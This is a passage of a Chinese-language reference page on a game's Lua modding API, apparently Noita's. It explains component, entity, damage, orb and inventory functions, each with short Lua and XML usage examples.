<span class="token attr-name">hp</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span>
<span class="token attr-name">max_hp</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span>
<span class="token attr-name">materials_create_messages</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">ragdoll_filenames_file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> 
<span class="token attr-name">fire_probability_of_ignition</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">ragdoll_fx_forced</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DISINTEGRATED<span class="token punctuation">"</span></span>
<span class="token attr-name">ragdoll_material</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rock_static_glow<span class="token punctuation">"</span></span>
<span class="token attr-name">minimum_knockback_force</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span>
<span class="token attr-name">materials_that_damage</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> 
<span class="token attr-name">materials_how_much_damage</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>damage_multipliers</span>
<span class="token attr-name">melee</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.3<span class="token punctuation">"</span></span>
<span class="token attr-name">projectile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.5<span class="token punctuation">"</span></span>
<span class="token attr-name">explosion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span>
<span class="token attr-name">electricity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span>
<span class="token attr-name">ice</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span>
<span class="token attr-name">fire</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.1<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>damage_multipliers</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DamageModelComponent</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>获取深层标签(damage_multipliers)的值就可以用如下的方法：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> fire_damage <span class="token operator">=</span> <span class="token function">ComponentObjectGetValue2</span><span class="token punctuation">(</span>comp_id<span class="token punctuation">,</span> <span class="token string">"damage_multipliers"</span><span class="token punctuation">,</span> <span class="token string">"fire"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="ComponentObjectSetValue2"><a href="#ComponentObjectSetValue2" class="headerlink" title="ComponentObjectSetValue2"></a><code>ComponentObjectSetValue2</code></h3><blockquote>
<p>ComponentObjectSetValue2( component_id:int, object_name:string, field_name:string, value_or_values:multiple_types ) [Sets the value of a field in a component subobject. Value(s) should have a type matching the field type. Reports error if the values weren’t given in correct type, the field type is not supported or ‘object_name’ is not a metaobject.]</p>
</blockquote>
<p>输入组件id，对象名，字段名，值，例：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">ComponentObjectSetValue2</span><span class="token punctuation">(</span>damagemodel_comp<span class="token punctuation">,</span> <span class="token string">"damage_multipliers"</span><span class="token punctuation">,</span> <span class="token string">"melee"</span><span class="token punctuation">,</span> <span class="token number">1.5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="ComponentAddTag"><a href="#ComponentAddTag" class="headerlink" title="ComponentAddTag"></a><code>ComponentAddTag</code></h3><blockquote>
<p>ComponentAddTag( component_id:int, tag:string )</p>
</blockquote>
<p>给组件加标签，输入组件id和标签名，无返回值</p>
<h3 id="ComponentRemoveTag"><a href="#ComponentRemoveTag" class="headerlink" title="ComponentRemoveTag"></a><code>ComponentRemoveTag</code></h3><blockquote>
<p>ComponentRemoveTag( component_id:int, tag:string )</p>
</blockquote>
<p>移除组件标签，输入组件id和标签名，无返回值</p>
<h3 id="ComponentGetTags"><a href="#ComponentGetTags" class="headerlink" title="ComponentGetTags"></a><code>ComponentGetTags</code></h3><blockquote>
<p>ComponentGetTags( component_id:int ) -&gt; string|nil [Returns a string where the tags are comma-separated, or nil if can’t find ‘component_id’ component.]</p>
</blockquote>
<p>输入组件id，返回用逗号分隔的一整个标签字符串，组件id不存在时返回nil</p>
<h3 id="ComponentHasTag"><a href="#ComponentHasTag" class="headerlink" title="ComponentHasTag"></a><code>ComponentHasTag</code></h3><blockquote>
<p>ComponentHasTag( component_id:int, tag:string ) -&gt; bool</p>
</blockquote>
<p>组件是否具有标签，输入组件id和标签名，返回一个bool值</p>
<h3 id="ComponentGetIsEnabled"><a href="#ComponentGetIsEnabled" class="headerlink" title="ComponentGetIsEnabled"></a><code>ComponentGetIsEnabled</code></h3><blockquote>
<p>ComponentGetIsEnabled( component_id:int ) -&gt; bool [Returns true if the given component exists and is enabled, else false.]</p>
</blockquote>
<p>获取组件是否可用，输入组件id返回bool值。</p>
<p>注：设置组件禁用与否用EntitySetComponentIsEnabled和EntitySetComponentsWithTagEnabled</p>
<h3 id="ComponentGetEntity"><a href="#ComponentGetEntity" class="headerlink" title="ComponentGetEntity"></a><code>ComponentGetEntity</code></h3><blockquote>
<p>ComponentGetEntity( component_id:int ) -&gt; entity_id:int [Returns the id of the entity that owns a component, or 0.]</p>
</blockquote>
<p>获取拥有特定组件的实体，输入组件id返回实体id，没有则为0</p>
<h3 id="ComponentGetMembers"><a href="#ComponentGetMembers" class="headerlink" title="ComponentGetMembers"></a><code>ComponentGetMembers</code></h3><blockquote>
<p>ComponentGetMembers( component_id:int ) -&gt; {string-string}|nil [Returns a string-indexed table of string.]</p>
</blockquote>
<p>输入组件id，返回一个字符串-索引的表，似乎包括保持默认的字段</p>
<h3 id="ComponentObjectGetMembers"><a href="#ComponentObjectGetMembers" class="headerlink" title="ComponentObjectGetMembers"></a><code>ComponentObjectGetMembers</code></h3><blockquote>
<p>ComponentObjectGetMembers( component_id:int, object_name:string ) -&gt; {string-string}|nil [Returns a string-indexed table of string or nil.]</p>
</blockquote>
<p>输入组件id和object名，返回一个字符串-索引的表</p>
<h3 id="ComponentGetTypeName"><a href="#ComponentGetTypeName" class="headerlink" title="ComponentGetTypeName"></a><code>ComponentGetTypeName</code></h3><blockquote>
<p>ComponentGetTypeName( component_id:int ) -&gt; string</p>
</blockquote>
<p>输入组件id，返回组件名（如：AnimalAIComponent）</p>
<h2 id="其它实体-组件相关"><a href="#其它实体-组件相关" class="headerlink" title="其它实体/组件相关"></a>其它实体/组件相关</h2><h3 id="GetUpdatedEntityID"><a href="#GetUpdatedEntityID" class="headerlink" title="GetUpdatedEntityID"></a><code>GetUpdatedEntityID</code></h3><blockquote>
<p>GetUpdatedEntityID() -&gt; entity_id:int</p>
</blockquote>
<p>获取更新的实体id，一个非常常用的api，用于获取一个目标</p>
<h3 id="GetUpdatedComponentID"><a href="#GetUpdatedComponentID" class="headerlink" title="GetUpdatedComponentID"></a><code>GetUpdatedComponentID</code></h3><blockquote>
<p>GetUpdatedComponentID() -&gt; component_id:int</p>
</blockquote>
<p>获取更新的组件id</p>
<h3 id="EntityInflictDamage"><a href="#EntityInflictDamage" class="headerlink" title="EntityInflictDamage"></a><code>EntityInflictDamage</code></h3><blockquote>
<p>EntityInflictDamage( entity:int, amount:number, damage_type:string, description:string, ragdoll_fx:string, impulse_x:number, impulse_y:number, entity_who_is_responsible:int = 0, world_pos_x:number = entity_x, world_pos_y:number = entity_y, knockback_force:number = 0 )</p>
</blockquote>
<p>给实体施加一个伤害，输入实体id，伤害数值（有一个系数），伤害类型，描述（随意填写），使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityInflictDamage</span><span class="token punctuation">(</span> v<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"DAMAGE_CURSE"</span><span class="token punctuation">,</span> <span class="token string">"$damage_supernova"</span><span class="token punctuation">,</span> <span class="token string">"DISINTEGRATED"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> entity_id <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityInflictDamage</span><span class="token punctuation">(</span>controlled_entity<span class="token punctuation">,</span> <span class="token number">2000000</span><span class="token punctuation">,</span> <span class="token string">"DAMAGE_CURSE"</span><span class="token punctuation">,</span> <span class="token string">"something"</span><span class="token punctuation">,</span> <span class="token string">"NONE"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">GameGetWorldStateEntity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="EntityIngestMaterial"><a href="#EntityIngestMaterial" class="headerlink" title="EntityIngestMaterial"></a><code>EntityIngestMaterial</code></h3><blockquote>
<p>EntityIngestMaterial( entity:int, material_type:number, amount:number ) [Has the same effects that would occur if ‘entity’ eats ‘amount’ number of cells of ‘material_type’ from the game world. Use this instead of directly modifying IngestionComponent values, if possible. Might not work with non-player entities. Use CellFactory_GetType() to convert a material name to material type.]</p>
</blockquote>
<p>实体摄入材料，输入实体id，材料种类（数字），数量。和实体在游戏世界里吃下amount像素的材料有同样的效果。尽可能用这个函数而不是直接修改IngestionComponent组件的字段。可能对非玩家实体不生效。用CellFactory_GetType()去把材料名转化成需要的id数字，参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityIngestMaterial</span><span class="token punctuation">(</span> entity_id<span class="token punctuation">,</span> <span class="token function">CellFactory_GetType</span><span class="token punctuation">(</span><span class="token string">"fungi"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="EntityRemoveIngestionStatusEffect"><a href="#EntityRemoveIngestionStatusEffect" class="headerlink" title="EntityRemoveIngestionStatusEffect"></a><code>EntityRemoveIngestionStatusEffect</code></h3><blockquote>
<p>EntityRemoveIngestionStatusEffect( entity:int, status_type_id:string )</p>
</blockquote>
<p>移除实体的摄入效果，输入实体id，状态名，参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityRemoveIngestionStatusEffect</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>my_player<span class="token punctuation">.</span>entity<span class="token punctuation">,</span> <span class="token string">"CHARM"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="EntityRemoveStainStatusEffect"><a href="#EntityRemoveStainStatusEffect" class="headerlink" title="EntityRemoveStainStatusEffect"></a><code>EntityRemoveStainStatusEffect</code></h3><blockquote>
<p>EntityRemoveStainStatusEffect( entity:int, status_type_id:string, status_cooldown:int = 0 )</p>
</blockquote>
<p>移除实体的沾染效果，输入实体id，状态名，冷却（默认为0），使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityRemoveStainStatusEffect</span><span class="token punctuation">(</span> player_id<span class="token punctuation">,</span> <span class="token string">"PROTECTION_ALL"</span><span class="token punctuation">,</span> <span class="token number">5</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="EntityAddRandomStains"><a href="#EntityAddRandomStains" class="headerlink" title="EntityAddRandomStains"></a><code>EntityAddRandomStains</code></h3><blockquote>
<p>EntityAddRandomStains( entity:int, material_type:number, amount:number ) [Adds random visible stains of ‘material_type’ to entity. ‘amount’ controls the number of stain cells added. Does nothing if ‘entity’ doesn’t have a SpriteStainsComponent. Use CellFactory_GetType() to convert a material name to material type.]</p>
</blockquote>
<p>增加沾染脏污的贴图效果，输入实体id，材料id（CellFactory_GetType()），数量。增加随机的可见的脏污到实体上，amount控制添加的像素数，如果没有SpriteStainsComponent则什么也不会发生。</p>
<h3 id="EntitySetDamageFromMaterial"><a href="#EntitySetDamageFromMaterial" class="headerlink" title="EntitySetDamageFromMaterial"></a><code>EntitySetDamageFromMaterial</code></h3><blockquote>
<p>EntitySetDamageFromMaterial( entity:int, material_name:string, damage:number ) [Modifies DamageModelComponents materials_that_damage and materials_how_much_damage variables (and their parsed out data structures)]</p>
</blockquote>
<p>设置实体的材料伤害，输入实体id，材料名，伤害。修改DamageModelComponent中的materials_that_damage和materials_how_much_damage variables字段。<br>两个字段的定义：<br><pre class="line-numbers language-none"><code class="language-none">std::string        materials_that_damage               acid [0, 1]         list of materials that do damage, separated by &#39;,&#39; e.g. &#39;acid, fire, smoke&#39;&quot;
std::string        materials_how_much_damage           0.1 [0, 1]          &quot;list of damage amount per material in materials_that_damage, separated by &#39;,&#39;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">if</span><span class="token punctuation">(</span> orbcount <span class="token operator">==</span> <span class="token number">12</span> <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token function">EntitySetDamageFromMaterial</span><span class="token punctuation">(</span> entity<span class="token punctuation">,</span> <span class="token string">"magic_liquid_polymorph"</span><span class="token punctuation">,</span> <span class="token number">0.35</span><span class="token punctuation">)</span> <span class="token keyword">end</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> orbcount <span class="token operator">==</span> <span class="token number">13</span> <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token function">EntitySetDamageFromMaterial</span><span class="token punctuation">(</span> entity<span class="token punctuation">,</span> <span class="token string">"magic_liquid_random_polymorph"</span><span class="token punctuation">,</span> <span class="token number">0.35</span><span class="token punctuation">)</span> <span class="token keyword">end</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> orbcount <span class="token operator">==</span> <span class="token number">14</span> <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token function">EntitySetDamageFromMaterial</span><span class="token punctuation">(</span> entity<span class="token punctuation">,</span> <span class="token string">"magic_liquid_teleportation"</span><span class="token punctuation">,</span> <span class="token number">0.35</span><span class="token punctuation">)</span> <span class="token keyword">end</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> orbcount <span class="token operator">==</span> <span class="token number">15</span> <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token function">EntitySetDamageFromMaterial</span><span class="token punctuation">(</span> entity<span class="token punctuation">,</span> <span class="token string">"magic_liquid_movement_faster"</span><span class="token punctuation">,</span> <span class="token number">0.35</span><span class="token punctuation">)</span> <span class="token keyword">end</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> orbcount <span class="token operator">==</span> <span class="token number">16</span> <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token function">EntitySetDamageFromMaterial</span><span class="token punctuation">(</span> entity<span class="token punctuation">,</span> <span class="token string">"material_confusion"</span><span class="token punctuation">,</span> <span class="token number">0.35</span><span class="token punctuation">)</span> <span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="EntityRefreshSprite"><a href="#EntityRefreshSprite" class="headerlink" title="EntityRefreshSprite"></a><code>EntityRefreshSprite</code></h3><blockquote>
<p>EntityRefreshSprite( entity:int, sprite_component:int ) [Immediately refreshes the given SpriteComponent. Might be useful with text sprites if you want them to update more often than once a second.]</p>
</blockquote>
<p>立刻刷新贴图组件。如果想要文本贴图超过每秒更新一次可能会有用。输入实体id，组件id</p>
<h3 id="EntityGetWandCapacity"><a href="#EntityGetWandCapacity" class="headerlink" title="EntityGetWandCapacity"></a><code>EntityGetWandCapacity</code></h3><blockquote>
<p>EntityGetWandCapacity( entity:int ) -&gt; int [Returns the capacity of a wand entity, or 0 if ‘entity’ doesnt exist.]</p>
</blockquote>
<p>获取魔杖容量，输入魔杖的实体id，返回容量，如果不存在返回0</p>
<h3 id="EntityGetHotspot"><a href="#EntityGetHotspot" class="headerlink" title="EntityGetHotspot"></a><code>EntityGetHotspot</code></h3><blockquote>
<p>EntityGetHotspot( entity:int, hotspot_tag:string, transformed:bool, include_disabled_components:bool = false ) -&gt; x:number,y:number [Returns the position of a hot spot defined by a HotspotComponent. If ‘transformed’ is true, will return the position in world coordinates, transformed using the entity’s transform.]</p>
</blockquote>
<p>获取HotspotComponent的位置，比如手，发射点等等。输入实体id，热点标签，是否transformed，是否包含禁用的组件，返回坐标。如果transformed为true，返回在世界坐标系下的坐标<br>参考：<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HotspotComponent</span>
      <span class="token attr-name">_tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hand<span class="token punctuation">"</span></span>
      <span class="token attr-name">sprite_hotspot_name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hand<span class="token punctuation">"</span></span>
  <span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HotspotComponent</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HotspotComponent</span>
    <span class="token attr-name">_tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shoot_pos<span class="token punctuation">"</span></span>
    <span class="token attr-name">offset.x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
    <span class="token attr-name">offset.y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-2<span class="token punctuation">"</span></span>
  <span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HotspotComponent</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="EntityGetFirstHitboxCenter"><a href="#EntityGetFirstHitboxCenter" class="headerlink" title="EntityGetFirstHitboxCenter"></a><code>EntityGetFirstHitboxCenter</code></h3><blockquote>
<p>EntityGetFirstHitboxCenter( entity_id:int ) -&gt; (x:number,y:number)|nil [Returns the centroid of first enabled HitboxComponent found in entity, the position of the entity if no hitbox is found, or nil if the entity does not exist. All returned positions are in world coordinates.]</p>
</blockquote>
<p>返回实体第一个没禁用的HitboxComponent组件的中心，没有该组件则返回实体坐标，实体不存在返回nil，均为世界坐标系下的。</p>
<h2 id="Game……"><a href="#Game……" class="headerlink" title="Game……"></a>Game……</h2><h3 id="GameScreenshake"><a href="#GameScreenshake" class="headerlink" title="GameScreenshake"></a><code>GameScreenshake</code></h3><blockquote>
<p>GameScreenshake( strength:number, x:number = camera_x, y:number = camera_y )</p>
</blockquote>
<p>摇晃屏幕，输入力度（参考值：5-150），一对坐标，默认镜头位置</p>
<h3 id="GameOnCompleted"><a href="#GameOnCompleted" class="headerlink" title="GameOnCompleted"></a><code>GameOnCompleted</code></h3><blockquote>
<p>GameOnCompleted() — this does the achievement</p>
</blockquote>
<p>用处不明，似乎只是做一个标记</p>
<h3 id="GameGiveAchievement"><a href="#GameGiveAchievement" class="headerlink" title="GameGiveAchievement"></a><code>GameGiveAchievement</code></h3><blockquote>
<p>GameGiveAchievement( id:string )</p>
</blockquote>
<p>输入成就的名称，一个字符串，给予成就。效果同上，似乎只是做个标记，不对游戏内容产生影响</p>
<h3 id="GameDoEnding2"><a href="#GameDoEnding2" class="headerlink" title="GameDoEnding2()"></a><code>GameDoEnding2()</code></h3><blockquote>
<p>GameDoEnding2()</p>
</blockquote>
<p>进入和平结局（33魔球）</p>
<h3 id="GameIsIntroPlaying"><a href="#GameIsIntroPlaying" class="headerlink" title="GameIsIntroPlaying"></a><code>GameIsIntroPlaying</code></h3><blockquote>
<p>GameIsIntroPlaying() -&gt; bool</p>
</blockquote>
<p>游戏是否在播放intro动画？大概是这个意思吧，返回一个bool值</p>
<h3 id="GameGetIsGamepadConnected"><a href="#GameGetIsGamepadConnected" class="headerlink" title="GameGetIsGamepadConnected"></a><code>GameGetIsGamepadConnected</code></h3><blockquote>
<p>GameGetIsGamepadConnected() -&gt; bool</p>
</blockquote>
<p>游戏是否连接了手柄</p>
<h3 id="GameGetWorldStateEntity"><a href="#GameGetWorldStateEntity" class="headerlink" title="GameGetWorldStateEntity"></a><code>GameGetWorldStateEntity</code></h3><blockquote>
<p>GameGetWorldStateEntity() -&gt; entity_id:int</p>
</blockquote>
<p>获取世界状态实体，返回实体id，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> world_state_entity <span class="token operator">=</span> <span class="token function">GameGetWorldStateEntity</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">local</span> comp <span class="token operator">=</span> <span class="token function">EntityGetComponent</span><span class="token punctuation">(</span> world_state_entity<span class="token punctuation">,</span> <span class="token string">"WorldStateComponent"</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<h3 id="GameGetPlayerStatsEntity"><a href="#GameGetPlayerStatsEntity" class="headerlink" title="GameGetPlayerStatsEntity"></a><code>GameGetPlayerStatsEntity</code></h3><blockquote>
<p>GameGetPlayerStatsEntity() -&gt; entity_id:int</p>
</blockquote>
<p>获取玩家状态实体，返回一个实体id，找不到使用参考</p>
<h3 id="GameGetOrbCountAllTime"><a href="#GameGetOrbCountAllTime" class="headerlink" title="GameGetOrbCountAllTime"></a><code>GameGetOrbCountAllTime</code></h3><blockquote>
<p>GameGetOrbCountAllTime() -&gt; int</p>
</blockquote>
<p>获取所有游戏历史中获取的最多魔球数量，返回一个int数</p>
<h3 id="GameGetOrbCountThisRun"><a href="#GameGetOrbCountThisRun" class="headerlink" title="GameGetOrbCountThisRun"></a><code>GameGetOrbCountThisRun</code></h3><blockquote>
<p>GameGetOrbCountThisRun() -&gt; int</p>
</blockquote>
<p>获取本局游戏中的魔球获取数量，返回一个int数</p>
<h3 id="GameGetOrbCollectedThisRun"><a href="#GameGetOrbCollectedThisRun" class="headerlink" title="GameGetOrbCollectedThisRun"></a><code>GameGetOrbCollectedThisRun</code></h3><blockquote>
<p>GameGetOrbCollectedThisRun( orb_id_zero_based:int ) -&gt; bool</p>
</blockquote>
<p>输入一个魔球id，返回是否在本局中已收集</p>
<h3 id="GameGetOrbCollectedAllTime"><a href="#GameGetOrbCollectedAllTime" class="headerlink" title="GameGetOrbCollectedAllTime"></a><code>GameGetOrbCollectedAllTime</code></h3><blockquote>
<p>GameGetOrbCollectedAllTime( orb_id_zero_based:int ) -&gt; bool</p>
</blockquote>
<p>输入一个魔球id，返回是否在所有游戏历史中收集过</p>
<h3 id="GameClearOrbsFoundThisRun"><a href="#GameClearOrbsFoundThisRun" class="headerlink" title="GameClearOrbsFoundThisRun"></a><code>GameClearOrbsFoundThisRun</code></h3><blockquote>
<p>GameClearOrbsFoundThisRun()</p>
</blockquote>
<p>归零本局游戏的魔球获取数量，游戏中用于开启NG+</p>
<h3 id="GameGetOrbCountTotal"><a href="#GameGetOrbCountTotal" class="headerlink" title="GameGetOrbCountTotal"></a><code>GameGetOrbCountTotal</code></h3><blockquote>
<p>GameGetOrbCountTotal() -&gt; int [Returns the number of orbs, picked or not.]</p>
</blockquote>
<p>返回魔球数，包含没捡起来的</p>
<h3 id="GameRegenItemAction"><a href="#GameRegenItemAction" class="headerlink" title="GameRegenItemAction"></a><code>GameRegenItemAction</code></h3><blockquote>
<p>GameRegenItemAction( entity_id:int )</p>
</blockquote>
<p>重新生成一个物品动作，输入实体id，找不到使用参考</p>
<h3 id="GameRegenItemActionsInContainer"><a href="#GameRegenItemActionsInContainer" class="headerlink" title="GameRegenItemActionsInContainer"></a><code>GameRegenItemActionsInContainer</code></h3><blockquote>
<p>GameRegenItemActionsInContainer( entity_id:int )</p>
</blockquote>
<p>重新生成一个container里的物品动作</p>
<h3 id="GameRegenItemActionsInPlayer"><a href="#GameRegenItemActionsInPlayer" class="headerlink" title="GameRegenItemActionsInPlayer"></a><code>GameRegenItemActionsInPlayer</code></h3><blockquote>
<p>GameRegenItemActionsInPlayer( entity_id:int )</p>
</blockquote>
<p>输入实体id，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">（无限法术天赋）
<span class="token comment">-- this goes through the items player is holding and sets their uses_remaining to -1</span>
<span class="token function">GameRegenItemActionsInPlayer</span><span class="token punctuation">(</span> entity_who_picked <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
<h3 id="GameKillInventoryItem"><a href="#GameKillInventoryItem" class="headerlink" title="GameKillInventoryItem"></a><code>GameKillInventoryItem</code></h3><blockquote>
<p>GameKillInventoryItem( inventory_owner_entity_id:int, item_entity_id:int )</p>
</blockquote>
<p>清除一个物品栏里的物品，输入物品栏拥有者实体id，物品实体id，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> inventory_items <span class="token operator">=</span> <span class="token function">EntityGetAllChildren</span><span class="token punctuation">(</span> inventory <span class="token punctuation">)</span>

<span class="token comment">-- remove default items</span>
<span class="token keyword">if</span> inventory_items <span class="token operator">~=</span> <span class="token keyword">nil</span> <span class="token keyword">then</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span>item_entity <span class="token keyword">in</span> <span class="token function">ipairs</span><span class="token punctuation">(</span> inventory_items <span class="token punctuation">)</span> <span class="token keyword">do</span>
<span class="token function">GameKillInventoryItem</span><span class="token punctuation">(</span> player_entity<span class="token punctuation">,</span> item_entity <span class="token punctuation">)</span>
<span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="GamePickUpInventoryItem"><a href="#GamePickUpInventoryItem" class="headerlink" title="GamePickUpInventoryItem"></a><code>GamePickUpInventoryItem</code></h3><blockquote>
<p>GamePickUpInventoryItem( who_picks_up_entity_id:int, item_entity_id:int, do_pick_up_effects:bool = true )</p>
</blockquote>
<p>输入捡起实体的id，物品id，是否产生一个捡起的效果（默认有），使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">（给予初始杖）
<span class="token keyword">local</span> item_entity <span class="token operator">=</span> <span class="token function">EntityLoad</span><span class="token punctuation">(</span> item<span class="token punctuation">,</span> i <span class="token operator">*</span> <span class="token number">997</span><span class="token punctuation">,</span> i <span class="token operator">*</span> <span class="token number">853</span> <span class="token punctuation">)</span>
<span class="token function">GamePickUpInventoryItem</span><span class="token punctuation">(</span> player_entity<span class="token punctuation">,</span> item_entity<span class="token punctuation">,</span> <span class="token keyword">false</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
<h3 id="GameGetAllInventoryItems"><a href="#GameGetAllInventoryItems" class="headerlink" title="GameGetAllInventoryItems"></a><code>GameGetAllInventoryItems</code></h3><blockquote>
<p>GameGetAllInventoryItems( entity_id:int ) -&gt; {item_entity_id}|nil [Returns all the inventory items that entity_id has.]</p>
</blockquote>
<p>输入实体id，返回该实体有的所有的物品栏id（表）</p>
<h3 id="GameDropAllItems"><a href="#GameDropAllItems" class="headerlink" title="GameDropAllItems"></a><code>GameDropAllItems</code></h3><blockquote>
<p>GameDropAllItems( entity_id:int )</p>
</blockquote>
<p>输入实体id，drop所有物品，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> entity_id <span class="token operator">=</span> <span class="token function">GetUpdatedEntityID</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">GameDropAllItems</span><span class="token punctuation">(</span> entity_id <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<h3 id="GameDropPlayerInventoryItems"><a href="#GameDropPlayerInventoryItems" class="headerlink" title="GameDropPlayerInventoryItems"></a><code>GameDropPlayerInventoryItems</code></h3><blockquote>
<p>GameDropPlayerInventoryItems( entity_id:int )</p>
</blockquote>
<p>drop玩家的物品栏物品，找不到使用参考</p>
